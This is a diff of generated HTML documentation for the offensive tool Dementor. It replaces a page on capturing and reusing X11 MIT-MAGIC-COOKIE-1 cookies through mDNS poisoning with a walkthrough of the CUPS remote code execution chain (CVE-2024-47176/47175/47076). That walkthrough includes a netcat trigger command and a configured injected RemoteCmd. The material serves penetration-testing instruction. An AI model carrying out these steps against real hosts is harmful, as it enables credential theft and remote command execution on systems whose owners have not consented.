@@ -2,8 +2,8 @@
 <html lang="en" data-accent-color="cyan" data-content_root="../">
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Stealing XAuth Cookies - Dementor 1.0.0.dev10 documentation</title><link rel="shortcut icon" href="../_static/favicon.ico"/><link rel="index" title="Index" href="../genindex.html" /><link rel="search" title="Search" href="../search.html" /><link rel="next" title="Abusing CUPS for RCE" href="cups.html" /><link rel="prev" title="WebDAV Fallback" href="webdav_fallback.html" />
-      <link rel="canonical" href="https://matrixeditor.github.io/dementor/examples/x11_cookies.html" /><script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Abusing CUPS for RCE - Dementor 1.0.0.dev10 documentation</title><link rel="shortcut icon" href="../_static/favicon.ico"/><link rel="index" title="Index" href="../genindex.html" /><link rel="search" title="Search" href="../search.html" /><link rel="next" title="Main" href="../config/main.html" /><link rel="prev" title="Stealing XAuth Cookies" href="x11_cookies.html" />
+      <link rel="canonical" href="https://matrixeditor.github.io/dementor/examples/cups.html" /><script>
     function setColorMode(t){let e=document.documentElement;e.setAttribute("data-color-mode",t);let a=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,s=t;"auto"===t&&(s=a?"dark":"light"),"light"===s?(e.classList.remove("dark"),e.classList.add("light")):(e.classList.remove("light"),e.classList.add("dark"))}
     setColorMode(localStorage._theme||"dark");
   </script><link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=397bb51e" />
@@ -11,6 +11,7 @@
     <link rel="stylesheet" type="text/css" href="../_static/copybutton.css?v=76b2166b" />
     <link rel="stylesheet" type="text/css" href="../_static/sphinx-design.min.css?v=95c83b7e" />
     <link media="print" rel="stylesheet" type="text/css" href="../_static/print.css?v=20ff2c19" />
+    <link rel="stylesheet" type="text/css" href="../_static/tabs.css?v=a5c4661c" />
     <link rel="stylesheet" type="text/css" href="../_static/theme.css?v=e875d3b6" />
     <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -22,8 +23,8 @@
 }
 </style>
     <meta property="og:type" content="website"/>
-<meta property="og:url" content="https://matrixeditor.github.io/dementor/examples/x11_cookies.html"/>
-<meta property="og:title" content="Stealing XAuth Cookies"/>
+<meta property="og:url" content="https://matrixeditor.github.io/dementor/examples/cups.html"/>
+<meta property="og:title" content="Abusing CUPS for RCE"/>
 <meta name="twitter:card" content="summary"/>
   </head>
 <body><div class="sy-head">
@@ -112,8 +113,8 @@ data-aria-dark="Switch to auto color mode">
 <li class="toctree-l1 _expand"><a class="reference internal" href="kdc.html">Rogue Kerberos  KDC</a></li>
 <li class="toctree-l1 _expand"><a class="reference internal" href="smtp_downgrade.html">SMTP/IMAP/POP3 Downgrade</a></li>
 <li class="toctree-l1 _expand"><a class="reference internal" href="webdav_fallback.html">WebDAV Fallback</a></li>
-<li class="toctree-l1 current"><a class="current reference internal" href="#">Stealing XAuth Cookies</a></li>
-<li class="toctree-l1 _expand"><a class="reference internal" href="cups.html">Abusing CUPS for RCE</a></li>
+<li class="toctree-l1 _expand"><a class="reference internal" href="x11_cookies.html">Stealing XAuth Cookies</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Abusing CUPS for RCE</a></li>
 </ul>
 <p class="caption" role="heading" aria-level="3"><span class="caption-text">Configuration &#9881;&#65039;</span></p>
 <ul>
@@ -154,10 +155,11 @@ data-aria-dark="Switch to auto color mode">
       <i class="i-lucide close"></i>
     </button>
     <div class="sy-scrollbar sy-rside-inner px-6 xl:top-16 xl:sticky xl:pl-0 pt-6 pb-4"><div class="localtoc"><h3>On this page</h3><ul>
-<li><a class="reference internal" href="#using-multicast-poisoning-to-capture-xauth-cookies">Using Multicast Poisoning to Capture XAuth Cookies</a></li>
+<li><a class="reference internal" href="#triggering-get-printer-attributes-requests">Triggering <code class="docutils literal notranslate"><span class="pre">get-printer-attributes</span></code> Requests</a></li>
+<li><a class="reference internal" href="#abusing-cve-2024-47175-cve-2024-47076">Abusing CVE-2024-47175 / CVE-2024-47076</a></li>
 </ul>
 </div><div class="edit-this-page">
-  <a href="https://github.com/MatrixEditor/dementor/blob/main/docs/examples/x11_cookies.rst">Edit this page</a>
+  <a href="https://github.com/MatrixEditor/dementor/blob/main/docs/examples/cups.rst">Edit this page</a>
 </div></div>
   </aside>
   <div class="rside-overlay js-menu" role="button" aria-label="Close Table of Contents" aria-controls="rside" aria-expanded="false"></div>
@@ -173,7 +175,7 @@ data-aria-dark="Switch to auto color mode">
         <span>/</span>
         <meta itemprop="position" content="1" />
       </li><li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-        <strong itemprop="name">Stealing XAuth Cookies</strong>
+        <strong itemprop="name">Abusing CUPS for RCE</strong>
         <meta itemprop="position" content="2" />
       </li></ol>
     <div class="xl:hidden ml-1">
@@ -186,59 +188,100 @@ data-aria-dark="Switch to auto color mode">
 </div><div class="flex flex-col break-words justify-between">
       <div class="min-w-0 max-w-6xl px-6 pb-6 pt-8 xl:px-12">
         <article class="yue" role="main">
-          <section id="stealing-xauth-cookies">
-<span id="example-x11-cookies"></span><h1>Stealing XAuth Cookies<a class="headerlink" href="#stealing-xauth-cookies" title="Link to this heading">¶</a></h1>
-<p>The X11 protocol allows graphical applications to display their user interface on a remote system.
-If access control is enabled (e.g., using <code class="docutils literal notranslate"><span class="pre">xhost</span></code>), the user must supply valid authentication
-credentials—known as <em>X authorization cookies</em>—before launching the application.</p>
-<p>Let’s consider the following scenario: A user wants to run a graphical application locally but have it
-display remotely on a server named <code class="docutils literal notranslate"><span class="pre">UbuntuSrv</span></code>. Since the user doesn’t know the IP address, they use
-the hostname instead:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span data-line="1">$<span class="w"> </span><span class="nv">DISPLAY</span><span class="o">=</span>UbuntuSrv:0<span class="w"> </span>&lt;program-name&gt;
+          <section id="abusing-cups-for-rce">
+<span id="example-cups"></span><h1>Abusing CUPS for RCE<a class="headerlink" href="#abusing-cups-for-rce" title="Link to this heading">¶</a></h1>
+<p>Since version <code class="docutils literal notranslate"><span class="pre">1.0.0.dev10</span></code>, <em>Dementor</em> can be used to exploit <a class="reference external" href="https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5">CVE-2024-47076</a>
+and <a class="reference external" href="https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6">CVE-2024-47175</a>. <strong>However</strong>, several aspects
+must be kept in mind before attempting to run the exploit:</p>
+<div class="admonition attention">
+<p class="admonition-title">Attention</p>
+<ol class="arabic simple">
+<li><p>You need a vulnerable version of the <cite>cups-browsed</cite> service running</p></li>
+<li><p>The <code class="docutils literal notranslate"><span class="pre">foomatic-db-engine</span></code> must be installed for the RCE to be triggered correctly</p></li>
+<li><p>You must be able to start a print job on the target machine</p></li>
+</ol>
+</div>
+<section id="triggering-get-printer-attributes-requests">
+<h2>Triggering <code class="docutils literal notranslate"><span class="pre">get-printer-attributes</span></code> Requests<a class="headerlink" href="#triggering-get-printer-attributes-requests" title="Link to this heading">¶</a></h2>
+<p>First things first, let’s revisit <a class="reference external" href="https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/">Attacking UNIX Systems via CUPS, Part I</a>
+and <a class="reference external" href="https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8">CVE-2024-47176</a> again. The general
+format of requests that will trigger a <code class="docutils literal notranslate"><span class="pre">get-printer-attributes</span></code> request is as follows:</p>
+<div class="highlight-bnf notranslate"><div class="highlight"><pre><span></span><span data-line="1">REQUEST := 0 <span class="p">&lt;</span><span class="nc">SPACE</span><span class="p">&gt;</span> 3 <span class="p">&lt;</span><span class="nc">SPACE</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nc">URL</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nc">SPACE</span><span class="p">&gt;</span> &quot;<span class="p">&lt;</span><span class="nc">LOCATION</span><span class="p">&gt;</span>&quot; <span class="p">&lt;</span><span class="nc">SPACE</span><span class="p">&gt;</span> &quot;<span class="p">&lt;</span><span class="nc">INFO</span><span class="p">&gt;</span>&quot;
 </span></pre></div>
 </div>
-<p>On Windows, if the hostname cannot be resolved via DNS, it will automatically fall back to <strong>multicast DNS</strong>
-(mDNS) for resolution. <em>Dementor</em> can exploit this fallback mechanism to capture authentication cookies.</p>
-<p>However, unless explicitly configured, no XAuth data is sent by default. In such cases, <em>Dementor</em> will log
-an anonymous request:</p>
+<p>By echoing a specific broadcast string into netcat, we can trigger the target’s printer to
+send an HTTP request back to us:</p>
+<div class="literal-block-wrapper docutils container" id="id1">
+<div class="code-block-caption"><span class="caption-text">Command to trigger a <code class="docutils literal notranslate"><span class="pre">get-printer-attributes</span></code> request</span><a class="headerlink" href="#id1" title="Link to this code">¶</a></div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="n">echo</span> <span class="s1">&#39;0 3 http://&lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt;/printers/data1 &quot;Office&quot; &quot;Printer&quot;&#39;</span> \
+</span><span data-line="2">    <span class="o">|</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nu</span> <span class="o">&lt;</span><span class="n">TARGET_IP</span><span class="o">&gt;</span> <span class="mi">631</span>
+</span></pre></div>
+</div>
+</div>
+<p>The configuration necessary to capture IPP requests with <em>Dementor</em> is:</p>
+<div class="sphinx-tabs docutils container">
+<div aria-label="Tabbed content" class="closeable" role="tablist"><button aria-controls="panel-0-0-0" aria-selected="true" class="sphinx-tabs-tab" id="tab-0-0-0" name="0-0" role="tab" tabindex="0">Dementor.toml</button><button aria-controls="panel-0-0-1" aria-selected="false" class="sphinx-tabs-tab" id="tab-0-0-1" name="0-1" role="tab" tabindex="-1">CLI</button></div><div aria-labelledby="tab-0-0-0" class="sphinx-tabs-panel" id="panel-0-0-0" name="0-0" role="tabpanel" tabindex="0"><div class="highlight-toml notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="k">[Dementor]</span>
+</span><span data-line="2"><span class="c1"># [...]</span>
+</span><span data-line="3"><span class="hll"><span class="n">IPP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span>
+</span></span><span data-line="4"><span class="c1"># [...]</span>
+</span></pre></div>
+</div>
+</div><div aria-labelledby="tab-0-0-1" class="sphinx-tabs-panel" hidden="true" id="panel-0-0-1" name="0-1" role="tabpanel" tabindex="0"><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="gp">$ </span>Dementor<span class="w"> </span>-I<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$INTERFACE</span><span class="s2">&quot;</span><span class="w"> </span>-O<span class="w"> </span><span class="nv">IPP</span><span class="o">=</span>On<span class="w"> </span>-O<span class="w"> </span>IPP.Port<span class="o">=</span><span class="m">4444</span>
+</span></pre></div>
+</div>
+</div></div>
+<p>On success, <em>Dementor</em> will display the captured request:</p>
 <div class="demo docutils container">
 <div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="gp"># </span><span class="o">[</span>...<span class="o">]</span>
-</span><span data-line="2"><span class="go">X11  192.168.56.1  6000  [*] Anonymous X11 request from 192.168.56.125 (version: 11.0)</span>
-</span><span data-line="3"><span class="gp"># </span><span class="o">[</span>...<span class="o">]</span>
+</span><span data-line="2"><span class="go">IPP  192.168.56.124  4444  [*] IPP-Request: &lt;GET_PRINTER_ATTRIBUTES&gt; (Version: 2.0, ID: 0x1c)</span>
+</span><span data-line="3"><span class="go">IPP  192.168.56.124  4444  [+] Serving IPP printer PRINTER_NAME_HERE</span>
+</span><span data-line="4"><span class="gp"># </span><span class="o">[</span>...<span class="o">]</span>
 </span></pre></div>
 </div>
 </div>
 <div class="admonition note">
 <p class="admonition-title">Note</p>
-<p>A more robust approach to capturing X11 authentication and session data would be a traditional
-Man-in-the-Middle (MITM) attack between the client and the X server.</p>
+<p>The CUPS client will automatically send the <cite>get-printer-attributes</cite> request when it
+discovers a remote printer via cups-browsed.</p>
 </div>
-<section id="using-multicast-poisoning-to-capture-xauth-cookies">
-<h2>Using Multicast Poisoning to Capture XAuth Cookies<a class="headerlink" href="#using-multicast-poisoning-to-capture-xauth-cookies" title="Link to this heading">¶</a></h2>
-<p>As mentioned above, when Windows fails to resolve a hostname via DNS, it will attempt mDNS.
-If a user specifies a valid <em>Xauthority</em> file when launching their application, the authentication
-cookie will be sent <strong>in cleartext</strong> to any host claiming that name.</p>
-<p>For instance, a user on Windows attempts to launch an <code class="docutils literal notranslate"><span class="pre">xterm</span></code> session directed at <code class="docutils literal notranslate"><span class="pre">UbuntuSrv</span></code>.
-Even if the cookie is correct, <em>Dementor</em> will reject access and terminate the session:</p>
-<div class="demo docutils container">
-<img alt="../_images/x11-xterm_remote_display.png" class="align-center" src="../_images/x11-xterm_remote_display.png" />
-</div>
-<p><em>Dementor</em> logs the captured cookie like so:</p>
-<div class="demo docutils container">
-<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="gp"># </span><span class="o">[</span>...<span class="o">]</span>
-</span><span data-line="2"><span class="go">X11  192.168.56.116  6000   [+] Captured MIT-MAGIC-COOKIE-1 for &lt;missing-user&gt; from 192.168.56.116:</span>
-</span><span data-line="3"><span class="go">X11  192.168.56.116  6000   MIT-MAGIC-COOKIE-1: 8032c808e97ef530a585f4f0c6ed2d5b</span>
-</span><span data-line="4"><span class="gp"># </span><span class="o">[</span>...<span class="o">]</span>
+</section>
+<section id="abusing-cve-2024-47175-cve-2024-47076">
+<h2>Abusing CVE-2024-47175 / CVE-2024-47076<a class="headerlink" href="#abusing-cve-2024-47175-cve-2024-47076" title="Link to this heading">¶</a></h2>
+<p>To exploit these vulnerabilities, we must configure the command to be injected. (<em>Dementor</em> will
+display this configured command in the IPP response)</p>
+<div class="sphinx-tabs docutils container">
+<div aria-label="Tabbed content" class="closeable" role="tablist"><button aria-controls="panel-1-1-0" aria-selected="true" class="sphinx-tabs-tab" id="tab-1-1-0" name="1-0" role="tab" tabindex="0">Dementor.toml</button><button aria-controls="panel-1-1-1" aria-selected="false" class="sphinx-tabs-tab" id="tab-1-1-1" name="1-1" role="tab" tabindex="-1">CLI</button></div><div aria-labelledby="tab-1-1-0" class="sphinx-tabs-panel" id="panel-1-1-0" name="1-0" role="tabpanel" tabindex="0"><div class="highlight-toml notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="k">[Dementor]</span>
+</span><span data-line="2"><span class="c1"># [...]</span>
+</span><span data-line="3"><span class="hll"><span class="n">IPP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span>
+</span></span><span data-line="4"><span class="c1"># [...]</span>
+</span><span data-line="5">
+</span><span data-line="6"><span class="k">[IPP]</span>
+</span><span data-line="7"><span class="n">RemoteCmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;echo 1 &gt; /tmp/I_AM_VULNERABLE&quot;</span>
 </span></pre></div>
 </div>
-</div>
-<p>You can then manually reuse this cookie to authenticate to the legitimate X server:</p>
-<div class="demo docutils container">
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span data-line="1">$<span class="w"> </span>touch<span class="w"> </span>./cookie
-</span><span data-line="2">$<span class="w"> </span>xauth<span class="w"> </span>-f<span class="w"> </span>./cookie<span class="w"> </span>add<span class="w"> </span>UbuntuSrv:0<span class="w"> </span>MIT-MAGIC-COOKIE-1<span class="w"> </span>8032c808e97ef530a585f4f0c6ed2d5b
-</span><span data-line="3">$<span class="w"> </span><span class="nv">DISPLAY</span><span class="o">=</span>UbuntuSrv:0<span class="w"> </span><span class="nv">XAUTHORITY</span><span class="o">=</span>./cookie<span class="w"> </span>&lt;program-name&gt;
+</div><div aria-labelledby="tab-1-1-1" class="sphinx-tabs-panel" hidden="true" id="panel-1-1-1" name="1-1" role="tabpanel" tabindex="0"><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="gp">$ </span>Dementor<span class="w"> </span>-I<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$INTERFACE</span><span class="s2">&quot;</span><span class="w"> </span>-O<span class="w"> </span><span class="nv">IPP</span><span class="o">=</span>On<span class="w"> </span>-O<span class="w"> </span>IPP.Port<span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
+</span><span data-line="2"><span class="w">    </span>-O<span class="w"> </span>IPP.RemoteCmd<span class="o">=</span><span class="s2">&quot;echo 1 &gt; /tmp/I_AM_VULNERABLE&quot;</span>
 </span></pre></div>
 </div>
+</div></div>
+<p>After triggering a <code class="docutils literal notranslate"><span class="pre">get-printer-attributes</span></code> request, the <cite>cups-browsed</cite> service should show debug output similar to this:</p>
+<figure class="align-center" id="id2">
+<img alt="../_images/ipp_cups-browsed.png" src="../_images/ipp_cups-browsed.png" />
+<figcaption>
+<p><span class="caption-text"><cite>cups-browsed</cite> debug output during remote printer discovery. (version: 2.0.1)</span><a class="headerlink" href="#id2" title="Link to this image">¶</a></p>
+</figcaption>
+</figure>
+<p>To confirm the injection worked, inspect the PPD file generated in <code class="docutils literal notranslate"><span class="pre">/etc/cups/ppd</span></code>:</p>
+<figure class="align-center" id="id3">
+<img alt="../_images/ipp_cups-ppd_file.png" src="../_images/ipp_cups-ppd_file.png" />
+<figcaption>
+<p><span class="caption-text">Generated PPD file contains injected attributes that will be used on the next print attempt.</span><a class="headerlink" href="#id3" title="Link to this image">¶</a></p>
+</figcaption>
+</figure>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The next step would be to start a print job using the newly registered printer. However, for
+the RCE to work, <cite>foomatic</cite> must be installed on the target system.</p>
 </div>
 </section>
 </section>
@@ -249,16 +292,16 @@ Even if the cookie is correct, <em>Dementor</em> will reject access and terminat
   </svg>
   <span>Back to top</span>
 </button><div class="navigation flex print:hidden"><div class="navigation-prev">
-    <a href="webdav_fallback.html">
+    <a href="x11_cookies.html">
       <i class="i-lucide chevron-left"></i>
       <div class="page-info">
-        <span>Previous</span><div class="title">WebDAV Fallback</div></div>
+        <span>Previous</span><div class="title">Stealing XAuth Cookies</div></div>
     </a>
   </div><div class="navigation-next">
-    <a href="cups.html">
+    <a href="../config/main.html">
       <div class="page-info">
         <span>Next</span>
-        <div class="title">Abusing CUPS for RCE</div>
+        <div class="title">Main</div>
       </div>
       <i class="i-lucide chevron-right"></i>
     </a>
@@ -292,5 +335,6 @@ Even if the cookie is correct, <em>Dementor</em> will reject access and terminat
       <script src="../_static/clipboard.min.js?v=a7894cd8"></script>
       <script src="../_static/copybutton.js?v=f281be69"></script>
       <script src="../_static/design-tabs.js?v=f930bc37"></script>
-      <script src="../_static/shibuya.js?v=e2230717"></script></body>
+      <script src="../_static/shibuya.js?v=e2230717"></script>
+      <script src="../_static/tabs.js?v=3030b3cb"></script></body>
 </html>
